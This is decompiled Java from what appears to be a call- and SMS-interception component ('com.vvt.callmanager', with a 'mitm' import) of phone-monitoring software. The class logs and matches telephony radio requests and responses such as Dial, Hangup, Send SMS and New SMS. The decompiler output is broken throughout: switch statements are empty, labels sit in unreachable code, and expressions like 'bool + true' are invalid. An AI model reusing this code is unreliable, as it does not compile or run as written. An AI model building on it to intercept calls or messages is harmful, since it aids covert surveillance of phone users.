package com.vvt.callmanager.a;

import android.os.Parcel;
import com.vvt.callmanager.mitm.a;
import com.vvt.callmanager.ref.g;
import java.util.ArrayList;

public class m
{
  private static final boolean a = g.a;
  private static final boolean b = g.b;
  private ArrayList c;
  private a d;
  private String e;
  private boolean f;
  private boolean g;
  
  public m(String paramString, boolean paramBoolean1, boolean paramBoolean2)
  {
    this.e = paramString;
    this.f = paramBoolean1;
    this.g = paramBoolean2;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.c = localArrayList;
  }
  
  private void a(int paramInt)
  {
    String str1 = null;
    switch (paramInt)
    {
    }
    for (;;)
    {
      if (str1 != null)
      {
        String str2 = "--- %s ---";
        int i = 1;
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = str1;
        str1 = String.format(str2, arrayOfObject);
        b(str1);
      }
      return;
      str1 = "Answer";
      continue;
      str1 = "Flash";
      continue;
      str1 = "Merge";
      continue;
      str1 = "Dial";
      continue;
      str1 = "Get Current Calls";
      continue;
      str1 = "Switch";
      continue;
      str1 = "Set Mute";
      continue;
      str1 = "Hangup";
      continue;
      str1 = "Hangup Background";
      continue;
      str1 = "Hangup Foreground";
      continue;
      str1 = "Hangup LG";
      continue;
      str1 = "Send SMS";
      continue;
      str1 = "Send SMS and Expect More";
      continue;
      str1 = "SMS Acknowledge";
    }
  }
  
  private void b(int paramInt)
  {
    String str1 = null;
    switch (paramInt)
    {
    }
    for (;;)
    {
      if (str1 != null)
      {
        String str2 = "--- %s ---";
        int i = 1;
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = str1;
        str1 = String.format(str2, arrayOfObject);
        b(str1);
      }
      return;
      str1 = "Call State Changed";
      continue;
      str1 = "LG Call State Info";
      continue;
      str1 = "Call Waiting";
      continue;
      str1 = "Call Ring";
      continue;
      str1 = "New SMS";
      continue;
      str1 = "Answering Responded";
      continue;
      str1 = "Set Mute Responded";
      continue;
      str1 = "Hangup Responded";
      continue;
      str1 = "Send SMS Responded";
      continue;
      str1 = "Send SMS and Expect More Responded";
      continue;
      str1 = "SMS Acknowledge Responded";
    }
  }
  
  private n d(Parcel paramParcel)
  {
    Object localObject = l.a(paramParcel);
    int i = ((l)localObject).a;
    n localn;
    boolean bool;
    if (i == 0)
    {
      i = 0;
      localn = null;
      int j = this.c.size();
      int k = 0;
      if (k < j)
      {
        localn = (n)this.c.get(k);
        int m = localn.a;
        int n = ((l)localObject).b;
        if (m == n)
        {
          localObject = this.c;
          ((ArrayList)localObject).remove(k);
          bool = a;
          if (!bool) {}
        }
      }
    }
    for (;;)
    {
      return localn;
      i = bool + true;
      bool = i;
      break;
      i = 0;
      localn = null;
    }
  }
  
  public a a()
  {
    return this.d;
  }
  
  public void a(Parcel paramParcel)
  {
    paramParcel.setDataPosition(4);
    int i = paramParcel.readInt();
    int j = paramParcel.readInt();
    paramParcel.setDataPosition(0);
    ArrayList localArrayList = this.c;
    n localn = n.a(i, j);
    localArrayList.add(localn);
    boolean bool = this.f;
    if (bool)
    {
      bool = a;
      if (!bool) {}
    }
    a(i);
  }
  
  public void a(a parama)
  {
    this.d = parama;
  }
  
  public void a(String paramString)
  {
    boolean bool = this.f;
    if (!bool)
    {
      bool = b;
      if (!bool) {}
    }
    bool = this.g;
    if (bool)
    {
      a locala = this.d;
      if (locala != null)
      {
        locala = this.d;
        locala.a(paramString);
      }
    }
  }
  
  public int b(Parcel paramParcel)
  {
    paramParcel.setDataPosition(4);
    int i = paramParcel.readInt();
    paramParcel.setDataPosition(0);
    switch (i)
    {
    }
    for (;;)
    {
      return i;
      a(paramParcel);
    }
  }
  
  public ArrayList b()
  {
    return this.c;
  }
  
  public void b(String paramString)
  {
    boolean bool = this.f;
    if (bool) {}
    bool = this.g;
    if (bool)
    {
      a locala = this.d;
      if (locala != null)
      {
        locala = this.d;
        locala.a(paramString);
      }
    }
  }
  
  public int c(Parcel paramParcel)
  {
    int i = -1;
    Object localObject = l.a(paramParcel);
    int j = ((l)localObject).a;
    int k = 1;
    if (j == k) {
      i = ((l)localObject).b;
    }
    for (;;)
    {
      b(i);
      return i;
      localObject = d(paramParcel);
      if (localObject != null) {
        i = ((n)localObject).b;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/getInstance/m.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */